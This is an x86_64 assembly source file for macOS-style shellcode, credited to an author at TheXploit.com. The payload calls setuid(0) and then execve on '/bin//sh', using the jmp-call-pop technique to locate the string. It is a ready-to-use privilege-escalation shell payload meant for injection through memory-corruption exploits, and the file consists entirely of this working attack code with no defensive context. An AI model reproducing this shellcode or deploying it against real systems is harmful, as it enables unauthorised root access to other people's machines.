; File: setuid_shell_x86_64.asm
; Author: Dustin Schultz - TheXploit.com
BITS 64

section .text
global start

start:
a:
 mov r8b, 0x02          ; Unix class system calls = 2
 shl r8, 24             ; shift left 24 to the upper order bits
 or r8, 0x17            ; setuid = 23, or with class = 0x2000017
 xor edi, edi           ; zero out edi
 mov rax, r8            ; syscall number in rax
 syscall                ; invoke kernel
 jmp short c            ; jump to c
b:
 pop rdi                ; pop ret addr which = addr of /bin/sh
 add r8, 0x24           ; execve = 59, 0x24+r8=0x200003b
; mov rax, r8            ; syscall number in rax
 mov rax, 0x200003B
 xor rdx, rdx           ; zero out rdx
 push rdx               ; null terminate rdi, pushed backwards
 push rdi               ; push rdi = pointer to /bin/sh
 mov rsi, rsp           ; pointer to null terminated /bin/sh string
 syscall                ; invoke the kernel
c:
 call b                 ; call b, push ret of /bin/sh
 db '/bin//sh'          ; /bin/sh string
